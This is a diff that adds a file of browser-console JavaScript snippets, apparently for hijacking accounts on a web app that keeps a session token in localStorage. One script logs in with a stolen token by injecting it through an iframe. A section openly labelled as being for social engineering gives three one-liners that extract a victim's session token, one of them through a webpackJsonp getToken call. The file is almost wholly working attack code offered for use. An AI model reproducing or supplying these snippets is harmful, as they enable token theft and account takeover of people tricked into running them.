@@ -1,0 +1,30 @@
++++ SCRIPT TO LOGIN +++
+
+function login(token) {
+setInterval(() => {
+document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
+}, 50);
+setTimeout(() => {
+location.reload();
+}, 2500);
+}
+
+login('PASTE TOKEN HERE')
+
+--- SCRIPT TO LOGIN ---
+
++++ SCRIPT TO GET THE TOKEN, USED FOR SOCIAL ENGINEERING +++
+
+function getLocalStoragePropertyDescriptor() {const iframe = document.createElement('iframe');document.head.append(iframe);const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');iframe.remove();return pd;} Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());console.log(localStorage.token);
+
+OR
+
+javascript:document.getElementsByTagName("body")[0].innerHTML = localStorage.token;
+
+OR
+
+Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()
+
+--- SCRIPT TO GET THE TOKEN ---
+
+THESE SCRIPTS GO INTO THE CONSOLE IN DEV TOOLS
